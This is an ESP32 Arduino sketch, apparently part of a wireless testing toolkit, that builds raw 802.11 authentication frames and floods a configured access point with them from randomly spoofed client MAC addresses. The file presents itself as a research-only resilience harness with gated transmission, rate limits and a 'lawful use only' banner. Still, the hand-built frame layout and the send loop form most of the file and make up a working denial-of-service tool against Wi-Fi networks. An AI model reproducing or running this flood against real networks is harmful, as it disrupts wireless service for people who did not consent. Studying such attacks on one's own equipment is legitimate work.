/*
 * medusa_authflood — research-only authentication-capacity resilience harness.
 *
 * The prototype generates pre-association authentication requests so an
 * operator can study capacity handling on isolated equipment they control. It
 * makes no claim about receiver effect without independent lab evidence.
 *
 * It is excluded from the default product until the firmware-enforced scope,
 * rate, duration, audit, confirmation, and stop controls in the threat model
 * exist and have physical tests.
 */
#include <Arduino.h>
#include <WiFi.h>
#include "esp_wifi.h"
#include "medusa_tx_common.h"

#if defined(__has_include)
#  if __has_include("medusa_target.h")
#    include "medusa_target.h"
#  endif
#endif

#ifndef TARGET_CHANNEL
#define TARGET_CHANNEL 0
#endif
#ifndef TARGET_BSSID
#define TARGET_BSSID { 0, 0, 0, 0, 0, 0 }
#endif

static uint8_t bssid[6] = TARGET_BSSID;

// 30-byte open-system Authentication request
static uint8_t frame[30] = {
  0xB0, 0x00,               // FC: type=Mgmt(0), subtype=Auth(0xB)
  0x00, 0x00,               // duration
  0, 0, 0, 0, 0, 0,         // addr1 (DA)   = AP
  0x02, 0, 0, 0, 0, 0,      // addr2 (SA)   = random locally-administered client
  0, 0, 0, 0, 0, 0,         // addr3 (BSSID)= AP
  0x00, 0x00,               // sequence (chip fills, en_sys_seq)
  0x00, 0x00,               // auth algorithm = Open System (0)
  0x01, 0x00,               // auth transaction seq = 1
  0x00, 0x00                // status code = 0
};

static bool configured() {
  if (!TARGET_CHANNEL) return false;
  for (int i = 0; i < 6; i++) if (bssid[i]) return true;
  return false;
}


// ---- gated transmission -------------------------------------------------
// Every frame this sketch emits passes medusa_tx_send(), which consults the
// operator's session, scope, rate ceiling and latched stop before the radio
// is touched. Rate and burst come from configuration rather than a hardcoded
// delay(), so changing how hard this pushes needs no rebuild.
static bool tx_session_ready = false;

static void tx_session_start(const uint8_t *target) {
  mcfg_t cfg;
  mcfg_defaults(&cfg);           // replaced by the stored config once NVS is wired
  uint8_t allow[1][MTG_MAC_LEN];
  memcpy(allow[0], target, MTG_MAC_LEN);

  mtg_session_grant_t grant;
  tx_session_ready = medusa_tx_begin(&cfg, MCFG_PROFILE_AUTH, allow, 1, false, millis(), &grant);
  if (!tx_session_ready) {
    Serial.println("TX refused: no session (a stop may be latched, or scope is missing).");
    return;
  }
  // Report what was actually granted, not what was asked for.
  Serial.printf("TX session: %lu ms, %u frames/sec, burst %u, gap %u ms\n",
                (unsigned long)grant.duration_ms, (unsigned)grant.rate_per_sec,
                (unsigned)medusa_tx_burst(), (unsigned)medusa_tx_gap_ms());
}

void setup() {
  Serial.begin(115200);
  delay(600);
  Serial.println("\n=== medusa_authflood ===");
  Serial.println("LAWFUL USE ONLY - your own AP / authorized tests.");
  WiFi.mode(WIFI_STA);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  if (!configured()) { Serial.println("No target set -> idle."); return; }
  esp_wifi_set_channel(TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
  memcpy(frame + 4, bssid, 6);    // DA = AP
  memcpy(frame + 16, bssid, 6);   // BSSID = AP
  Serial.printf("AUTH FLOOD -> AP %02X:%02X:%02X:%02X:%02X:%02X  ch %d  (random spoofed clients)\n",
                bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], TARGET_CHANNEL);
  tx_session_start(bssid);
}

void loop() {
  if (!configured()) { delay(2000); return; }
  static uint32_t sent = 0;
  esp_err_t e = ESP_OK;
  for (int i = 0; i < 24; i++) {
    frame[10] = 0x02;                                  // locally-administered
    for (int j = 11; j < 16; j++) frame[j] = esp_random() & 0xFF;   // random source MAC
    e = medusa_tx_send(frame, (size_t)30, bssid, millis());
    sent++;
  }
  static uint32_t last = 0;
  if (millis() - last > 500) {
    last = millis();
    Serial.printf("authflood rc=0x%x sent=%u  %s\n", e, sent,
                  e == 0x102 ? "(BLOCKED - stock core)" : "(flooding)");
  }
  delay(medusa_tx_pacing_ms());
}
